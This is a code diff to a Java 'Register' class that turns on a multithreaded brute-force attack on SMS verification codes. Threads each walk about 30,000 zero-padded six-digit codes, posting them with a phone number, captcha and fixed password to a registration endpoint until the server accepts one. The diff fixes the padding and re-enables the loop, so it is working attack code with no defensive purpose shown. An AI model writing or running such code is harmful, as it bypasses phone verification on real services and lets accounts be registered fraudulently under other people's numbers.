@@ -14,6 +14,8 @@ import org.apache.http.message.BasicHeader;
 import org.apache.http.util.EntityUtils;
 
 import java.io.IOException;
+import java.text.DecimalFormat;
+import java.text.NumberFormat;
 import java.util.Scanner;
 
 /**
@@ -28,6 +30,7 @@ import java.util.Scanner;
  * @author 贾学雷
  */
 public class Register {
+
 
     public static String session;
     static String phone;
@@ -90,9 +93,12 @@ public class Register {
                 DBUtil.insertLiketry(likeTry);
                 return;
             }
-//            for (int i = 100000; i < 999999; i = i + 30000) {
-//                new MyThread(i, i + 30000).start();
-//            }
+            /*
+             *每个线程遍历3w验证码，直到服务器返回验证码成功消息停止所有线程
+             */
+            for (int i = 0,step=30000; i < 999999; i = i + step) {
+                new MyThread(i,i+step).start();
+            }
 
         } catch (Exception e) {
             e.printStackTrace();
@@ -123,10 +129,11 @@ public class Register {
             post.setHeader(header);
             HttpResponse resp;
             String result;
+            NumberFormat f=new DecimalFormat("000000");
             for (; start <= end; start++) {
-
                 try {
-                    post.setEntity(new StringEntity("cell=" + phone + "&captcha=" + captcha + "&smscode=" + start + "&password=jia123&password1=jia123&accept=true"));
+                    post.setEntity(new StringEntity("cell=" + phone + "&captcha=" + captcha +
+                            "&smscode=" + f.format(start) + "&password=jia123&password1=jia123&accept=true"));
                     resp = client.execute(post);
                     result = EntityUtils.toString(resp.getEntity());
                     System.out.println(start + result);
